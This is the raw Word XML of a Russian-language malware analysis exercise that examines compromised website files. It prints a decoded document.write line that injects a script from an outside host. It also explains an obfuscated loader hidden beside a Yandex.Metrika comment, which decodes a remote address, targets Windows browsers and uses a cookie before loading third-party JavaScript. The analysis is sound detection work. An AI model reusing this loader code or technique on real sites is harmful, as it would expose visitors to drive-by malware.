      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>После переворота строки и декодирования получается следующий код</w:t>
      </w:r>
      <w:r w:rsidR="008F673F" w:rsidRPr="008F673F">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="008F673F" w:rsidRDefault="00E91E50">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F673F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>document.write('&lt;scr' + 'ipt language="JavaScript" ' +</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00E91E50" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F673F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  'src="http://aptajax.info/?id=113069"&gt;&lt;/scr' + 'ipt&gt;');</w:t>
      </w:r>
      <w:r w:rsidR="00E91E50" w:rsidRPr="00E91E50">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00E91E50" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Этот код добавляет на страницу внешний </w:t>
      </w:r>
      <w:r>
        <w:t>script</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. Браузер должен загрузить </w:t>
      </w:r>
      <w:r>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> с </w:t>
      </w:r>
      <w:r>
        <w:t>aptajax</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>[.]</w:t>
      </w:r>
      <w:r>
        <w:t>info</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и выполнить его в контексте страницы.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Почему код подозрителен: адрес внешнего скрипта специально спрятан, используется </w:t>
      </w:r>
      <w:r>
        <w:t>eval</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>, а полезная часть файла скрыта после большого числа пустых строк</w:t>
      </w:r>
      <w:r w:rsidR="008F673F">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Задание 6 Продолжение</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Папка 4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Вердикт: есть признаки внедрения вредоносного загрузчика. Основной подозрительный файл — </w:t>
      </w:r>
      <w:r>
        <w:t>javascript</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>js</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_. В _</w:t>
      </w:r>
      <w:r>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">_ строка 856, рядом с комментарием </w:t>
      </w:r>
      <w:r>
        <w:t>Yandex</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>Metrika</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> подключён /</w:t>
      </w:r>
      <w:r>
        <w:t>cache</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>js</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>. Содержимое сохранённого файла не похоже на обычный счётчик Метрики.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Адрес сервера спрятан в массиве </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:t>na</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. К каждому числу прибавляется 5, затем вызывается </w:t>
      </w:r>
      <w:r>
        <w:t>String</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>fromCharCode</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. Получается </w:t>
      </w:r>
      <w:r>
        <w:t>yes</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>losttightgirl</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>ru</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>. Полный адрес:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00E91E50" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hxxp</w:t>
      </w:r>
      <w:r w:rsidRPr="00E91E50">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>://</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>yes</w:t>
      </w:r>
      <w:r w:rsidRPr="00E91E5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losttightgirl</w:t>
      </w:r>
      <w:r w:rsidRPr="00E91E50">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>[.]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ru</w:t>
      </w:r>
      <w:r w:rsidRPr="00E91E50"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ctd</w:t>
      </w:r>
      <w:r w:rsidRPr="00E91E50"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scripts</w:t>
      </w:r>
      <w:r w:rsidRPr="00E91E50">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>js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>Что делает скрипт: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1. Проверяет браузер по </w:t>
      </w:r>
      <w:r>
        <w:t>window</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>sidebar</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, наличию </w:t>
      </w:r>
      <w:r>
        <w:t>opera</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и условному комментарию для старого </w:t>
      </w:r>
      <w:r>
        <w:t>Internet</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Explorer</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. Отдельно проверяет, есть ли </w:t>
      </w:r>
      <w:r>
        <w:t>win</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> в </w:t>
      </w:r>
      <w:r>
        <w:t>navigator</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>platform</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. Это выбор посетителей с </w:t>
      </w:r>
      <w:r>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и определёнными старыми браузерами.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000E55A5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2. Работает с </w:t>
      </w:r>
      <w:r>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ctd</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">11. Если там не стоит 0, записывает 1 со сроком около суток и проверяет, сохранилась ли </w:t>
      </w:r>
      <w:r>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">3. Если проверки прошли, ждёт появления </w:t>
      </w:r>
      <w:r>
        <w:t>document</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>body</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. После этого создаёт </w:t>
      </w:r>
      <w:r>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> с </w:t>
      </w:r>
      <w:r>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:r>
        <w:t>ieb</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">" и добавляет </w:t>
      </w:r>
      <w:r>
        <w:t>script</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> с подготовленным внешним адресом в начало страницы.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="000E55A5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Почему код подозрителен: он скрывает адрес, выбирает ОС и браузер посетителя, проверяет </w:t>
      </w:r>
      <w:r>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и незаметно подключает сторонний </w:t>
      </w:r>
      <w:r>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>. Это похоже на загрузчик дальнейшей вредоносной части.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="0076625D">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="0076625D" w:rsidRPr="009D74D2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037015">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="94521961">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="466775625">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="439299049">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="919947235">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1216240466">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="251282768">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="367723381">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1218979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09"/>
    <w:rsid w:val="000E55A5"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00196582"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002A23AF"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00331A0C"/>
    <w:rsid w:val="004368E0"/>
    <w:rsid w:val="0049071D"/>
    <w:rsid w:val="0076625D"/>
    <w:rsid w:val="00776E6E"/>
    <w:rsid w:val="008F673F"/>
    <w:rsid w:val="00956D43"/>
    <w:rsid w:val="009D74D2"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C72D02"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00E91E50"/>
    <w:rsid w:val="00EC1513"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00FD647A"/>
    <w:rsid w:val="00FF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65242F"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{E747399E-84B6-744B-97A5-0B1D38CF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1242</Words>
  <Characters>7085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muted</cp:lastModifiedBy>
  <cp:revision>5</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-28T15:56:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>